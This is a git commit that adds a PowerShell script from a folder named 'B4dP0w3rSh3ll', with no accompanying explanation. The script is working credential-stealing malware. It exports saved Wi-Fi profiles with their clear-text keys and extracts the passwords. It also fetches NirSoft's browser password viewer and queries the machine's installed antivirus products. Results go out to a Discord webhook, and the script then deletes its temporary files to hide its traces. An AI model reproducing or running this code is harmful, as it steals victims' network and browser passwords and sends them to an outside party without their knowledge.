7585de5f5b63978bc076e0b8db0056489aaadcbe
qqwizzixxxx <125666833+qqwizzixxxx@users.noreply.github.com>
2024-09-17 23:33:50 +0300

    Add files via upload

---
+++ B4dP0w3rSh3ll/Str.ps1
@@ -0,0 +1,58 @@
+
+$desktop = ([Environment]::GetFolderPath("Desktop"))
+function Get-Nirsoft {
+
+  mkdir \temp 
+  cd \temp
+  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+  Expand-Archive 7z.zip 
+  .\7z\7za.exe e wbpv.zip
+
+}
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
+}
+
+function Wifi {
+New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
+Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
+Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
+Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
+Set-Location -Path "$env:temp"
+Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
+}
+
+ function Del-Nirsoft-File {
+  cd C:\
+  rmdir -R \temp
+}
+
+function version-av {
+  mkdir \temp 
+  cd \temp
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
+  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
+  cd C:\
+  rmdir -R \temp
+}
